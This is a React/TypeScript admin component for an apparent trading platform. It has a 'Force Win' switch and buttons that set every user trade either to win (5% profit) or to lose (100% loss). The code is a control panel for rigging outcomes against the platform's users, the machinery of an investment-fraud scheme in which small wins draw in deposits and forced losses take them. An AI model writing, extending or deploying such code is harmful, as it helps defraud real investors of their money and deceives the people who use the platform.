import React, { useState, useEffect } from 'react';
import { Button } from '@/components/ui/button';
import { Card } from '@/components/ui/card';
import { Switch } from '@/components/ui/switch';
import { toast } from '@/components/ui/use-toast';
import { supabaseAdminService } from '@/services/supabaseTradingService';
import { Crown, Shield, TrendingUp, TrendingDown } from 'lucide-react';

export const AdminTradingControl: React.FC = () => {
  const [forceWin, setForceWin] = useState(false);
  const [loading, setLoading] = useState(false);
  const [stats, setStats] = useState({
    forceWin: false,
    message: ''
  });

  useEffect(() => {
    loadSettings();
  }, []);

  const loadSettings = async () => {
    try {
      const settings = await supabaseAdminService.getSettings();
      setStats(settings);
      setForceWin(settings.forceWin);
    } catch (error) {
      console.error('Failed to load settings:', error);
    }
  };

  const toggleForceWin = async (enabled: boolean) => {
    setLoading(true);
    try {
      await supabaseAdminService.setForceWin(enabled);
      setForceWin(enabled);
      
      toast({
        title: enabled ? "Force Win Enabled" : "Force Win Disabled",
        description: enabled ? "All trades will now result in wins" : "All trades will now result in losses",
        variant: enabled ? "default" : "destructive"
      });
      
      await loadSettings();
    } catch (error) {
      console.error('Failed to update settings:', error);
      toast({
        title: "Failed to Update Settings",
        description: "Please try again",
        variant: "destructive"
      });
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="space-y-6">
      <Card className="bg-[#1E2329] border-[#2B3139] p-6">
        <div className="flex items-center justify-between mb-6">
          <div className="flex items-center gap-3">
            <Crown className="h-6 w-6 text-yellow-400" />
            <h2 className="text-xl font-bold text-[#EAECEF]">Trading Control</h2>
          </div>
          <Shield className="h-5 w-5 text-[#848E9C]" />
        </div>

        {/* Force Win Control */}
        <div className="space-y-4">
          <div className="flex items-center justify-between">
            <div className="space-y-1">
              <label className="text-sm font-medium text-[#EAECEF]">
                Force Win Mode
              </label>
              <p className="text-xs text-[#848E9C]">
                When enabled, all user trades will result in wins
              </p>
            </div>
            <Switch
              checked={forceWin}
              onCheckedChange={toggleForceWin}
              disabled={loading}
              className="data-[state=checked]:bg-green-500"
            />
          </div>

          {/* Status Display */}
          <div className={`p-4 rounded-lg border ${
            forceWin 
              ? 'bg-green-500/10 border-green-500/30' 
              : 'bg-red-500/10 border-red-500/30'
          }`}>
            <div className="flex items-center gap-3">
              {forceWin ? (
                <TrendingUp className="h-5 w-5 text-green-400" />
              ) : (
                <TrendingDown className="h-5 w-5 text-red-400" />
              )}
              <div>
                <p className={`font-semibold ${
                  forceWin ? 'text-green-400' : 'text-red-400'
                }`}>
                  {forceWin ? 'Force Win Active' : 'Force Lose Active'}
                </p>
                <p className="text-xs text-[#848E9C] mt-1">
                  {forceWin 
                    ? 'All trades will win (5% profit)' 
                    : 'All trades will lose (100% loss)'
                  }
                </p>
              </div>
            </div>
          </div>
        </div>

        {/* Quick Actions */}
        <div className="mt-6 grid grid-cols-2 gap-3">
          <Button
            onClick={() => toggleForceWin(true)}
            disabled={loading || forceWin}
            className="bg-green-500 hover:bg-green-600 text-white"
          >
            <TrendingUp className="h-4 w-4 mr-2" />
            Enable Wins
          </Button>
          <Button
            onClick={() => toggleForceWin(false)}
            disabled={loading || !forceWin}
            variant="destructive"
          >
            <TrendingDown className="h-4 w-4 mr-2" />
            Enable Losses
          </Button>
        </div>

        {/* System Status */}
        <div className="mt-6 p-4 bg-[#181A20] rounded-lg">
          <h3 className="text-sm font-semibold text-[#EAECEF] mb-3">System Status</h3>
          <div className="space-y-2">
            <div className="flex justify-between text-xs">
              <span className="text-[#848E9C]">Current Mode:</span>
              <span className={forceWin ? 'text-green-400' : 'text-red-400'}>
                {forceWin ? 'WIN MODE' : 'LOSS MODE'}
              </span>
            </div>
            <div className="flex justify-between text-xs">
              <span className="text-[#848E9C]">API Status:</span>
              <span className="text-green-400">Connected</span>
            </div>
            <div className="flex justify-between text-xs">
              <span className="text-[#848E9C]">Last Updated:</span>
              <span className="text-[#EAECEF]">
                {new Date().toLocaleTimeString()}
              </span>
            </div>
          </div>
        </div>
      </Card>
    </div>
  );
};
